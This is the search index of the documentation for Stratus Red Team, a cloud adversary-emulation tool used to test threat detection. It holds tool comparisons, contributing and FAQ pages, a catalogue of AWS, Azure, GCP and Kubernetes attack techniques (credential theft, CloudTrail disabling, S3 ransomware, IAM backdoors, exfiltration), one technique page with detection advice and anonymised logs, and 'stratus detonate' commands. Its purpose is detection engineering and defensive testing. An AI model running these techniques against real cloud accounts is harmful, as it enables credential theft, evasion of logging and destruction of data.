{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"<p>Welcome to the documentation of Stratus Red Team!</p> <p> </p> <p>Check out:</p> <ul> <li>The User Guide, to get started</li> <li>The list of available attack techniques</li> </ul> <p></p> Demo of Stratus Red Team. Click to enlarge"},{"location":"#motivation-behind-stratus-red-team","title":"Motivation Behind Stratus Red Team","text":"<p>When crafting and implementing threat detection rules, it is essential to have an easy way to execute granular attack techniques, to be able to validate that our detections work as expected.</p> <p>Think of Stratus Red Team as \"Atomic Red Team\u2122\", but focused on cloud.</p> <p>Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment.</p> Sample usage - Stopping a CloudTrail Trail (Defense Evasion)<pre><code>stratus detonate aws.defense-evasion.cloudtrail-stop\n</code></pre> <p>The attack techniques are mapped to MITRE ATT&amp;CK.</p>"},{"location":"comparison/","title":"Comparison With Other Tools","text":""},{"location":"comparison/#atomic-red-team-by-red-canary","title":"Atomic Red Team by Red Canary","text":"<p>Atomic Red Team\u2122 is library of tests mapped to the MITRE ATT&amp;CK\u00ae framework. Security teams can use Atomic Red Team to quickly, portably, and reproducibly test their environments.</p> <p>In 2021, Atomic Red Team added support for Cloud TTPs. In the summer 2022, Atomic Red Team also started leveraging Stratus Red Team to execute some of its cloud attack techniques.</p> <p>Atomic Red Team has very few cloud TTPs it implements itself. While Atomic Red Team is an awesome tool for endpoint security, it wasn't built purposely for cloud environments. In particular, it doesn't handle the prerequisite infrastructure and configuration necessary to detonate TTPs, and leaves that to the user.  For instance, AWS - Create Access Key and Secret Key requires you to create an IAM user prior to detonating the attack. Stratus Red Team packages this prerequisite logic, so you can detonate attack techniques without having to create any infrastructure or cloud configuration manually.</p> <p>However, the attack technique format of Atomic Red Team is based on YAML, and it's therefore easier to add new TTPs, even if they are not in the core of Atomic Red Team.</p>"},{"location":"comparison/#halberd-by-vectra-ai","title":"Halberd by Vectra AI.","text":"<p>Halberd is a powerful, multi-cloud security testing tool. Born out of the need for a unified, easy-to-use tool, Halberd enables you to proactively assess your cloud defenses by executing a comprehensive array of attack techniques across Entra ID, M365, Azure, and AWS. With its intuitive web interface, you can simulate real-world attacks, generate valuable telemetry, and validate your security controls with ease &amp; speed.</p> <p>Halberd is written in Python while stratus-red-team is written in Go and terraform file. Stratus-red-team provisions cloud infrastructure using terraform as IaC (Infrastructure as a Code) while Halberd doesn't have this feature. Halberd UI (User Interface) is using GUI (Graphical User Interface) while stratus-red-team is using CLI (Command Line Interface).</p> <p>Halberd is validating security control by simulating attacks on cloud infrastructure, while stratus-red-team is simulating attacks: from provisioning the cloud infrastructure, performing the attacks and deleting the created cloud resources. Both of the tools are using MITRE Attack to categorize the attacks.</p> <p>Halberd supports following platform: AWS, Azure, Microsoft Entra ID, GCP, and Microsoft M365 while stratus-red-team supports: AWS, Azure, AWS EKS (AWS Kubernetes Managed Service), Microsoft Entra ID, GCP and Kubernetes.</p>"},{"location":"comparison/#leonidas-by-f-secure-nick-jones","title":"Leonidas by F-Secure (Nick Jones)","text":"<p>Leonidas is a framework for executing attacker actions in the cloud. It provides a YAML-based format for defining cloud attacker tactics, techniques and procedures (TTPs) and their associated detection properties</p> <p>While Stratus Red Team and Leonidas have similar goals, their implementation is fundamentally different.</p> <ul> <li>Leonidas is a fully-fledged web application you deploy in your AWS account using Terraform, and then a CodePipeline pipeline.</li> <li>Then, you use \"Leo\", the test case orchestrator, to hit the web API and detonate attack techniques. </li> <li>Leonidas allows describing TTPs as YAML, making it easier to extend than Stratus Red Team. </li> <li>Leonidas does not handle prerequisites for detonating attack techniques.</li> <li>The attack techniques implemented by Leonidas are very granular, meaning it can be challenging to implement detection for them. See for instance: STS Get Caller Identity</li> <li>Leonidas comes with a set of suggested threat detection rules. However, as its attack techniques are very granular, it is practically impossible to use them as-is in a real production environment, as they would trigger many false positives.</li> </ul> <p>Stratus Red Team aims at being simpler to use (single binary) and does not require you to have prior infrastructure or configuration in your AWS account. Stratus Red Team focuses on a single thing: executing cloud attack tactics against a live environment, with minimal overhead. You can also use Stratus Red Team programmatically, from Go code, as a library.</p>"},{"location":"comparison/#pacu-by-rhino-security-labs","title":"Pacu by Rhino Security  Labs","text":"<p>Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Created and maintained by Rhino Security Labs, Pacu allows penetration testers to exploit configuration flaws within an AWS account, using modules to easily expand its functionality.</p> <p>Pacu is an offensive AWS exploitation framework, aimed at penetration testers. It implements various enumeration and exploitation methods, some straightforward and some advanced. For instance, lambda__backdoor_new_roles creates a Lambda function and a CloudWatch Event causing all future IAM roles created in an AWS account to be backdoored automatically. Pacu aims at being used against existing AWS infrastructure. </p> <p>Stratus Red Team is self-contained and does not necessitate prior infrastructure or configuration in your cloud environment. You can also use it programmatically, from Go code, as a library.</p>"},{"location":"comparison/#amazon-guardduty-tester-by-aws","title":"Amazon GuardDuty Tester by AWS","text":"<p>Amazon GuardDuty Tester is helpful to trigger GuardDuty findings. However, it is tightly coupled with GuardDuty and is a product-specific tool, even within the AWS ecosystem. If GuardDuty doesn't detect an attack technique, you won't find it in here.</p>"},{"location":"comparison/#aws-cloudsaga-by-aws","title":"AWS CloudSaga by AWS","text":"<p>AWS CloudSaga has a few simulation scenarios (five at the time of writing). Some of them are more focused around identifying vulnerable resources in your account (such as <code>imds_reveal</code> listing your EC2 instances without IMDSv2 enforced), while others are designed to simulate attacker behavior.</p> <p>The attacker behavior implemented by AWS Cloud Saga emulates several stages of the attack lifecycle, while Stratus Red Team purposely attempts to stay as granular as possible (see: Philosophy). As much as possible, Stratus Red Team techniques also reference real-world incidents or breaches.</p> <p>Finally, AWS CloudSaga is by design specific to AWS, while Stratus Red Team supports AWS, Azure, GCP and even Kubernetes.</p>"},{"location":"comparison/#cloudgoat-by-rhino-security-labs","title":"CloudGoat by Rhino Security Labs","text":"<p>CloudGoat is Rhino Security Labs' \"Vulnerable by Design\" AWS deployment tool. It allows you to hone your cloud cybersecurity skills by creating and completing several \"capture-the-flag\" style scenarios.</p> <p>CloudGoat is focused on spinning up vulnerable AWS infrastructure, so that you can exploit it to find a flag through a complete exploitation chain.</p> <p>Use CloudGoat to: practice your AWS offensive security and enumeration skills.</p> <p>Use Stratus Red Team to: emulate adversary behavior in AWS to validate your threat detection.</p>"},{"location":"comparison/#derf","title":"DeRF","text":"<p>DeRF takes inspiration from Stratus Red Team and implements a subset of its attack techniques. DeRF works by deploying a set of Google Cloud Workflows that detonate attack techniques by calling cloud providers' API  (see here for a sample attack technique).</p> <p>DerF is more extensible than Stratus Red Team, might be more suitable for a shared team usage. The barrier to entry to use Stratus Red Team is lower, since it's a single binary you can run from anywhere with access to a cloud environment with no setup required.</p>"},{"location":"comparison/#cloud-katana","title":"Cloud Katana","text":"<p>Cloud Katana is an attack simulation tool, similar to Stratus Red Team. It works by detonating attack techniques in Azure functions. Attack techniques are described using a JSON schema, making it more extensible than Stratus Red Team.</p> <p>As of September 27 2023, Cloud Katana contains 3 built-in attack techniques, all for Azure, while Stratus Red Team ships with attack techniques for Azure, AWS, GCP and Kubernetes.</p>"},{"location":"contributing/","title":"Contributing","text":"<p>We welcome pull requests, contributions and feedback! For any bug report or feedback, open an issue.</p>"},{"location":"contributing/#contributing-to-a-new-attack-technique","title":"Contributing to a new attack technique","text":"<p>Stratus Red Team is opinionated in the attack techniques it packages - see Philosophy. Feel free to open an issue to discuss ideas about new attack techniques. You can see the current backlog using the GitHub issue label <code>kind/new-technique</code>.</p> <p>To create a new attack technique:</p> <ol> <li>Create a new folder under <code>v2/internal/attacktechniques/your-cloud/your-mitre-attack-tactic/your-attack-name</code></li> <li>Create a <code>main.go</code> file that contains the detonation (and optionally, the revert) behavior. See for example cloudtrail-stop/main.go</li> <li>If your attack technique contains pre-requisites, create a <code>main.tf</code> file</li> <li>Add your attack technique to the imports of <code>v2/internal/attacktechniques/main.go</code></li> </ol> <p>To generate the logs dataset using Grimoire:</p> <ol> <li>Install Grimoire</li> <li>Run the following to detonate the attack and retrieve CloudTrail logs:</li> </ol> <pre><code># Build your local Stratus Red Team version\nmake\n\n# Generate cloud audit logs\n./bin/stratus warmup your-attack\ngrimoire shell --command 'export STRATUS_RED_TEAM_DETONATION_ID=$GRIMOIRE_DETONATION_ID; ./bin/stratus detonate your-attack' -o /tmp/your-attack.json\n# Press Ctrl+C once you see the expected events\n./bin/stratus cleanup your-attack\n</code></pre> <ol> <li>Anonymize the logs using LogLicker:</li> </ol> <pre><code># Note: see https://github.com/Permiso-io-tools/LogLicker/issues/5 for a currently necessary patch\n../LogLicker/venv/bin/python ../LogLicker/RunLogLicker.py rawtext -ifp /tmp/your-attack.json -ofp ./docs/detonation-logs/your-attack.json\n</code></pre> <ol> <li>Generate the docs:</li> </ol> <pre><code>make docs\n</code></pre>"},{"location":"contributing/#contributing-to-the-core-of-stratus-red-team","title":"Contributing to the core of Stratus Red Team","text":"<p>When contributing to the core of Stratus Red Team (i.e. anything that is not a new attack technique), include unit tests if applicable.</p>"},{"location":"faq/","title":"F.A.Q.","text":""},{"location":"faq/#what-permissions-do-i-need-to-run-stratus-red-team","title":"What permissions do I need to run Stratus Red Team?","text":"<p>Stratus Red Team is supposed to be run against a sandbox cloud account or Kubernetes cluster. Consequently, we recommend using it with an administrator role.</p> <p>If you don't have access to an administrator role but would still like to use Stratus Red Team, feel free to open an issue.</p>"},{"location":"faq/#how-does-stratus-red-team-persist-state","title":"How does Stratus Red Team persist state?","text":"<p>Stratus Red Team persists its state in <code>$HOME/.stratus-red-team</code>.</p>"},{"location":"faq/#how-can-i-add-my-own-attack-techniques-to-stratus-red-team","title":"How can I add my own attack techniques to Stratus Red Team?","text":"<p>Stratus Red Team is a self-contained Go binary.  The implication is that you can't add attack techniques without contributing to its core, as Go cannot easily load code dynamically. While Stratus Red Team may implement a plugin system in the future, we currently feel this would add substantial complexity for a limited value.</p> <p>Note that you can define custom attack techniques when using Stratus Red Team as a Go library.</p>"},{"location":"faq/#why-didnt-you-use-python","title":"Why didn't you use Python?","text":"<p>While using Python would have made some things easier, we consider it is very hard to write solid software in Python, in particular due to the lack of typing.</p> <p>In addition to that, the official Hashicorp Terraform wrapper (tfexec) used by Stratus Red Team is written in Go. There is no solid, officially-supported wrapper for Python.</p> <p>Finally, distributing Go binaries is much easier and leads to a better end-user experience.</p>"},{"location":"faq/#can-i-use-stratus-red-team-to-detonate-attack-techniques-against-my-own-infrastructure","title":"Can I use Stratus Red Team to detonate attack techniques against my own infrastructure?","text":"<ul> <li>AWS: This is currently not supported. Stratus Red Team takes care of spinning up all the required infrastructure before detonating attack techniques. Allowing to \"bring your own detonation infrastructure\" is on the roadmap.</li> <li>Kubernetes: Stratus Red Team does not create or destroy Kubernetes clusters for you. You point it at an existing Kubernetes cluster, and it will take care of creating any prerequisite Kubernetes resource required to detonate Kubernetes-specific attack techniques.</li> </ul>"},{"location":"attack-techniques/","title":"Attack Techniques","text":"<p>In this section, you'll find the list of attack techniques implemented in Stratus Red Team.</p> <ul> <li>AWS</li> <li>Kubernetes</li> <li>Azure</li> </ul>"},{"location":"attack-techniques/list/","title":"List of all Attack Techniques","text":"<p>This page contains the list of all Stratus Attack Techniques.</p> Name Platform MITRE ATT&amp;CK Tactics Retrieve EC2 Password Data AWS Credential Access Steal EC2 Instance Credentials AWS Credential Access Retrieve a High Number of Secrets Manager secrets (Batch) AWS Credential Access Retrieve a High Number of Secrets Manager secrets AWS Credential Access Retrieve And Decrypt SSM Parameters AWS Credential Access Delete CloudTrail Trail AWS Defense Evasion Disable CloudTrail Logging Through Event Selectors AWS Defense Evasion CloudTrail Logs Impairment Through S3 Lifecycle Rule AWS Defense Evasion Stop CloudTrail Trail AWS Defense Evasion Delete DNS query logs AWS Defense Evasion Attempt to Leave the AWS Organization AWS Defense Evasion Remove VPC Flow Logs AWS Defense Evasion Execute Discovery Commands on an EC2 Instance AWS Discovery Download EC2 Instance User Data AWS Discovery Enumerate SES AWS Discovery Launch Unusual EC2 instances AWS Execution Execute Commands on EC2 Instance via User Data AWS Execution, Privilege Escalation Execute Commands on SageMaker Notebook Instance via Lifecycle Configuration AWS Execution, Privilege Escalation Usage of ssm:SendCommand on multiple instances AWS Execution Usage of ssm:StartSession on multiple instances AWS Execution Open Ingress Port 22 on a Security Group AWS Exfiltration Exfiltrate an AMI by Sharing It AWS Exfiltration Exfiltrate EBS Snapshot by Sharing It AWS Exfiltration Exfiltrate RDS Snapshot by Sharing AWS Exfiltration Backdoor an S3 Bucket via its Bucket Policy AWS Exfiltration Invoke Bedrock Model AWS Impact S3 Ransomware through batch file deletion AWS Impact S3 Ransomware through client-side encryption AWS Impact S3 Ransomware through individual file deletion AWS Impact Console Login without MFA AWS Initial Access Usage of EC2 Serial Console to push SSH public key AWS Lateral Movement Usage of EC2 Instance Connect on multiple instances AWS Lateral Movement Backdoor an IAM Role AWS Persistence Create an Access Key on an IAM User AWS Persistence, Privilege Escalation Create an administrative IAM User AWS Persistence, Privilege Escalation Create a backdoored IAM Role AWS Persistence Create a Login Profile on an IAM User AWS Persistence, Privilege Escalation Backdoor Lambda Function Through Resource-Based Policy AWS Persistence Add a Malicious Lambda Extension AWS Persistence, Privilege Escalation Overwrite Lambda Function Code AWS Persistence Create an IAM Roles Anywhere trust anchor AWS Persistence, Privilege Escalation Generate temporary AWS credentials using GetFederationToken AWS Persistence Change IAM user password AWS Privilege Escalation Execute Command on Virtual Machine using Custom Script Extension Azure Execution Execute Commands on Virtual Machine using Run Command Azure Execution Export Disk Through SAS URL Azure Exfiltration Exfiltrate Azure Storage via public access Azure Exfiltration Exfiltrate Azure Storage through SAS URL Azure Exfiltration Azure Blob Storage ransomware through Encryption Scope using client-managed Key Vault key Azure Impact Azure ransomware via Storage Account Blob deletion Azure Impact Delete Azure resource lock Azure Impact Create Azure VM Bastion shareable link Azure Persistence Create Admin EKS Access Entry EKS Lateral Movement Backdoor aws-auth EKS ConfigMap EKS Persistence, Privilege Escalation Backdoor Entra ID application through service principal Entra ID Persistence, Privilege Escalation Backdoor Entra ID application Entra ID Persistence, Privilege Escalation Create Guest User Entra ID Persistence Create Hidden Scoped Role Assignment Through HiddenMembership AU Entra ID Persistence Create Application Entra ID Persistence, Privilege Escalation Create Sticky Backdoor User Through Restricted Management AU Entra ID Persistence Retrieve a High Number of Secret Manager secrets GCP Credential Access Enumerate Permissions of a GCP Service Account GCP Discovery Exfiltrate Compute Disk by sharing it GCP Exfiltration Exfiltrate Compute Image by sharing it GCP Exfiltration Exfiltrate Compute Disk by sharing a snapshot GCP Exfiltration Create a GCE GPU Virtual Machine GCP Impact Create GCE Instances in Multiple Zones GCP Impact Steal and Use the GCE Default Service Account Token from Outside Google Cloud GCP Credential Access, Initial Access Register SSH public key to instance metadata GCP Lateral Movement, Persistence Backdoor a GCP Service Account through its IAM Policy GCP Persistence Create an Admin GCP Service Account GCP Persistence, Privilege Escalation Create a GCP Service Account Key GCP Persistence, Privilege Escalation Invite an External User to a GCP Project GCP Persistence Dump All Secrets Kubernetes Credential Access Steal Pod Service Account Token Kubernetes Credential Access Create Admin ClusterRole Kubernetes Persistence, Privilege Escalation Create Client Certificate Credential Kubernetes Persistence Create Long-Lived Token Kubernetes Persistence Container breakout via hostPath volume mount Kubernetes Privilege Escalation Privilege escalation through node/proxy permissions Kubernetes Privilege Escalation Run a Privileged Pod Kubernetes Privilege Escalation Impersonate GCP Service Accounts GCP Privilege Escalation"},{"location":"attack-techniques/mitre-attack-coverage-matrices/","title":"MITRE ATT&CK Coverage Matrices","text":""},{"location":"attack-techniques/mitre-attack-coverage-matrices/#mitre-attck-coverage-by-platform","title":"MITRE ATT&amp;CK Coverage by Platform","text":"<p>This provides coverage matrices of MITRE ATT&amp;CK tactics and techniques currently covered by Stratus Red Team for different cloud platforms.</p> AWS Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementExfiltrationImpact Console Login without MFALaunch Unusual EC2 instancesBackdoor an IAM RoleExecute Commands on EC2 Instance via User DataDelete CloudTrail TrailRetrieve EC2 Password DataExecute Discovery Commands on an EC2 InstanceUsage of EC2 Serial Console to push SSH public keyOpen Ingress Port 22 on a Security GroupInvoke Bedrock Model Execute Commands on EC2 Instance via User DataCreate an Access Key on an IAM UserExecute Commands on SageMaker Notebook Instance via Lifecycle ConfigurationDisable CloudTrail Logging Through Event SelectorsSteal EC2 Instance CredentialsDownload EC2 Instance User DataUsage of EC2 Instance Connect on multiple instancesExfiltrate an AMI by Sharing ItS3 Ransomware through batch file deletion Execute Commands on SageMaker Notebook Instance via Lifecycle ConfigurationCreate an administrative IAM UserCreate an Access Key on an IAM UserCloudTrail Logs Impairment Through S3 Lifecycle RuleRetrieve a High Number of Secrets Manager secrets (Batch)Enumerate SESExfiltrate EBS Snapshot by Sharing ItS3 Ransomware through client-side encryption Usage of ssm:SendCommand on multiple instancesCreate a backdoored IAM RoleCreate an administrative IAM UserStop CloudTrail TrailRetrieve a High Number of Secrets Manager secretsExfiltrate RDS Snapshot by SharingS3 Ransomware through individual file deletion Usage of ssm:StartSession on multiple instancesCreate a Login Profile on an IAM UserCreate a Login Profile on an IAM UserDelete DNS query logsRetrieve And Decrypt SSM ParametersBackdoor an S3 Bucket via its Bucket Policy Backdoor Lambda Function Through Resource-Based PolicyAdd a Malicious Lambda ExtensionAttempt to Leave the AWS Organization Add a Malicious Lambda ExtensionCreate an IAM Roles Anywhere trust anchorRemove VPC Flow Logs Overwrite Lambda Function CodeChange IAM user password Create an IAM Roles Anywhere trust anchor Generate temporary AWS credentials using GetFederationToken Azure ExecutionPersistenceExfiltrationImpact Execute Command on Virtual Machine using Custom Script ExtensionCreate Azure VM Bastion shareable linkExport Disk Through SAS URLAzure Blob Storage ransomware through Encryption Scope using client-managed Key Vault key Execute Commands on Virtual Machine using Run CommandExfiltrate Azure Storage via public accessAzure ransomware via Storage Account Blob deletion Exfiltrate Azure Storage through SAS URLDelete Azure resource lock GCP Initial AccessPersistencePrivilege EscalationCredential AccessDiscoveryLateral MovementExfiltrationImpact Steal and Use the GCE Default Service Account Token from Outside Google CloudRegister SSH public key to instance metadataCreate an Admin GCP Service AccountRetrieve a High Number of Secret Manager secretsEnumerate Permissions of a GCP Service AccountRegister SSH public key to instance metadataExfiltrate Compute Disk by sharing itCreate a GCE GPU Virtual Machine Backdoor a GCP Service Account through its IAM PolicyCreate a GCP Service Account KeySteal and Use the GCE Default Service Account Token from Outside Google CloudExfiltrate Compute Image by sharing itCreate GCE Instances in Multiple Zones Create an Admin GCP Service AccountImpersonate GCP Service AccountsExfiltrate Compute Disk by sharing a snapshot Create a GCP Service Account Key Invite an External User to a GCP Project Kubernetes PersistencePrivilege EscalationCredential Access Create Admin ClusterRoleCreate Admin ClusterRoleDump All Secrets Create Client Certificate CredentialContainer breakout via hostPath volume mountSteal Pod Service Account Token Create Long-Lived TokenPrivilege escalation through node/proxy permissions Run a Privileged Pod Entra ID PersistencePrivilege Escalation Backdoor Entra ID application through service principalBackdoor Entra ID application through service principal Backdoor Entra ID applicationBackdoor Entra ID application Create Guest UserCreate Application Create Hidden Scoped Role Assignment Through HiddenMembership AU Create Application Create Sticky Backdoor User Through Restricted Management AU EKS PersistencePrivilege EscalationLateral Movement Backdoor aws-auth EKS ConfigMapBackdoor aws-auth EKS ConfigMapCreate Admin EKS Access Entry"},{"location":"attack-techniques/philosophy/","title":"Philosophy","text":"<p>Stratus Red Team is opinionated about the attack techniques it packages, in order to make sure it provides actual value, as opposed to emulating \"attacker behavior\" in a non-actionable way (such as <code>calling sts:GetCallerIdentity</code>).</p> <p>This page describes the characteristics that all attack techniques of Stratus Red Team should have.</p>"},{"location":"attack-techniques/philosophy/#be-granular","title":"Be Granular","text":"<p>An attack technique should be granular, meaning that it should emulate a single step of an attack.</p> <ul> <li>Good: Share an EBS snapshot with an external AWS account.</li> <li>Bad: Use an IAM access key to perform privilege escalation, run discovery commands, take an EBS snapshot of an instance, share the EBS snapshot with an external AWS account.</li> </ul>"},{"location":"attack-techniques/philosophy/#emulate-actual-attacker-activity","title":"Emulate actual attacker activity","text":"<p>It's always hard to draw a line between legitimate and malicious activity, and between \"theoretical\" and \"practical\" attack techniques.  In Stratus Red Team, we aim to follow the following acceptance criteria for adding new attack techniques:</p> <ul> <li>Techniques should emulate plausible and documented attacker behavior</li> <li>For every technique, we should have evidence it has been used in the past by attackers, pentesters, or malware</li> <li>It should always be possible to derive a reasonable detection rule from a technique</li> </ul> <p>Examples:</p> <ul> <li>Good: Delete a CloudTrail trail</li> <li>Bad: Run <code>sts:GetCallerIdentity</code><ul> <li>While attackers might use this API call, it is in no way indicative of attacker activity, as it's used by many services and client applications.</li> <li>It isn't emulating activity that could reasonably be thought to be malicious.</li> </ul> </li> </ul> <p>Stratus Red Team's goal is not to re-implement all AWS API calls that may be used by an attacker, neither to emulate all possible theoritical attack vectors.</p>"},{"location":"attack-techniques/philosophy/#be-self-sufficient","title":"Be Self-Sufficient","text":"<p>An attack technique should not be dependent on the state of the cloud environment it's run against.</p> <ul> <li>Good: Create an EBS snapshot and share it</li> <li>Bad: Expect an EBS snapshot exists in the account prior to running Stratus Red Team</li> </ul>"},{"location":"attack-techniques/supported-platforms/","title":"Supported Platforms","text":"<p>Stratus Red Team currently supports AWS, Azure, GCP,  Kubernetes, Amazon EKS, and Entra ID. See Connecting to your cloud account for setup instructions.</p>"},{"location":"attack-techniques/AWS/","title":"AWS","text":"<p>This page contains the Stratus attack techniques for AWS, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/AWS/#initial-access","title":"Initial Access","text":"<ul> <li>Console Login without MFA</li> </ul>"},{"location":"attack-techniques/AWS/#execution","title":"Execution","text":"<ul> <li> <p>Launch Unusual EC2 instances</p> </li> <li> <p>Execute Commands on EC2 Instance via User Data</p> </li> <li> <p>Execute Commands on SageMaker Notebook Instance via Lifecycle Configuration</p> </li> <li> <p>Usage of ssm:SendCommand on multiple instances</p> </li> <li> <p>Usage of ssm:StartSession on multiple instances</p> </li> </ul>"},{"location":"attack-techniques/AWS/#persistence","title":"Persistence","text":"<ul> <li> <p>Backdoor an IAM Role</p> </li> <li> <p>Create an Access Key on an IAM User</p> </li> <li> <p>Create an administrative IAM User</p> </li> <li> <p>Create a backdoored IAM Role</p> </li> <li> <p>Create a Login Profile on an IAM User</p> </li> <li> <p>Backdoor Lambda Function Through Resource-Based Policy</p> </li> <li> <p>Add a Malicious Lambda Extension</p> </li> <li> <p>Overwrite Lambda Function Code</p> </li> <li> <p>Create an IAM Roles Anywhere trust anchor</p> </li> <li> <p>Generate temporary AWS credentials using GetFederationToken</p> </li> </ul>"},{"location":"attack-techniques/AWS/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Execute Commands on EC2 Instance via User Data</p> </li> <li> <p>Execute Commands on SageMaker Notebook Instance via Lifecycle Configuration</p> </li> <li> <p>Create an Access Key on an IAM User</p> </li> <li> <p>Create an administrative IAM User</p> </li> <li> <p>Create a Login Profile on an IAM User</p> </li> <li> <p>Add a Malicious Lambda Extension</p> </li> <li> <p>Create an IAM Roles Anywhere trust anchor</p> </li> <li> <p>Change IAM user password</p> </li> </ul>"},{"location":"attack-techniques/AWS/#defense-evasion","title":"Defense Evasion","text":"<ul> <li> <p>Delete CloudTrail Trail</p> </li> <li> <p>Disable CloudTrail Logging Through Event Selectors</p> </li> <li> <p>CloudTrail Logs Impairment Through S3 Lifecycle Rule</p> </li> <li> <p>Stop CloudTrail Trail</p> </li> <li> <p>Delete DNS query logs</p> </li> <li> <p>Attempt to Leave the AWS Organization</p> </li> <li> <p>Remove VPC Flow Logs</p> </li> </ul>"},{"location":"attack-techniques/AWS/#credential-access","title":"Credential Access","text":"<ul> <li> <p>Retrieve EC2 Password Data</p> </li> <li> <p>Steal EC2 Instance Credentials</p> </li> <li> <p>Retrieve a High Number of Secrets Manager secrets (Batch)</p> </li> <li> <p>Retrieve a High Number of Secrets Manager secrets</p> </li> <li> <p>Retrieve And Decrypt SSM Parameters</p> </li> </ul>"},{"location":"attack-techniques/AWS/#discovery","title":"Discovery","text":"<ul> <li> <p>Execute Discovery Commands on an EC2 Instance</p> </li> <li> <p>Download EC2 Instance User Data</p> </li> <li> <p>Enumerate SES</p> </li> </ul>"},{"location":"attack-techniques/AWS/#lateral-movement","title":"Lateral Movement","text":"<ul> <li> <p>Usage of EC2 Serial Console to push SSH public key</p> </li> <li> <p>Usage of EC2 Instance Connect on multiple instances</p> </li> </ul>"},{"location":"attack-techniques/AWS/#exfiltration","title":"Exfiltration","text":"<ul> <li> <p>Open Ingress Port 22 on a Security Group</p> </li> <li> <p>Exfiltrate an AMI by Sharing It</p> </li> <li> <p>Exfiltrate EBS Snapshot by Sharing It</p> </li> <li> <p>Exfiltrate RDS Snapshot by Sharing</p> </li> <li> <p>Backdoor an S3 Bucket via its Bucket Policy</p> </li> </ul>"},{"location":"attack-techniques/AWS/#impact","title":"Impact","text":"<ul> <li> <p>Invoke Bedrock Model</p> </li> <li> <p>S3 Ransomware through batch file deletion</p> </li> <li> <p>S3 Ransomware through client-side encryption</p> </li> <li> <p>S3 Ransomware through individual file deletion</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/","title":"Retrieve EC2 Password Data","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#description","title":"Description","text":"<p>Runs ec2:GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances.</p> <p>See https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_GetPasswordData.html</p> <p>Warm-up: </p> <ul> <li>Create an IAM role without permissions to run ec2:GetPasswordData</li> </ul> <p>Detonation: </p> <ul> <li>Assume the role </li> <li>Run a number of ec2:GetPasswordData calls (which will be denied) using fictitious instance IDs</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.ec2-get-password-data\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#detection","title":"Detection","text":"<p>Identify principals making a large number of ec2:GetPasswordData calls, using CloudTrail's GetPasswordData event</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ec2:GetPasswordData</code></p> </li> <li> <p><code>sts:AssumeRole</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::751353041310:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:751353041310:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: fqhg8CzmasrUP43_LGsSmLVAAoKKY1CzQD3yqWpWiuZGOcVf2lhbhrrgsH8zy44fLcyyL6AsNcXA2GMJ3dl_2A8-mR5qE3oPDbM8k51n_qGm4fs4CdzuYK01dKPn4abyT2RXgAphwvURW0X-7R1OFTrWQnRH_W-pWiKQMJ756fS410A5yi504958O5VwFgOoxzBqwSFmvPt5WRVqBpuxTA_CXq5ogP2bjZzdHV8g_FnbHOARLP282lJjyBlNgP09SyB40bDDBxwDhYm_57waaVMA1Ww-_SlUt02HzVBZp7t7ta8udTCpZsoNuZyhUPmgli8z1pwkKVbsVe1cEhokOPPDm3p5ymcSZ4o5mwtEk18p46uE1SHVZSUv23Pjv68qZe0Sj_-rLKzqTi4Mhje-h5a7zRf8i3P-LGTGJHUxH4y5C2e659kdVhTaUJv8maLCMDiL7cUX2Px3xCyiWvtAnA_NIpmXEboFADuVzUsVVl-sTdCTT1rZn_-ts_xbdrqSmzvGKsDiTB1vJF3UwFjRuSRVSPD0g_U_rkZfqy0j-JEUU3DEIsh4SIWsrgDNuPzv0KQ\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"450230d4-b39e-4a18-a6a0-d07a6e2105cb\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"b20c2df5-71d5-441e-84c8-b424f1c78ffb\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-i2jnm5swa59p4fxg\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": 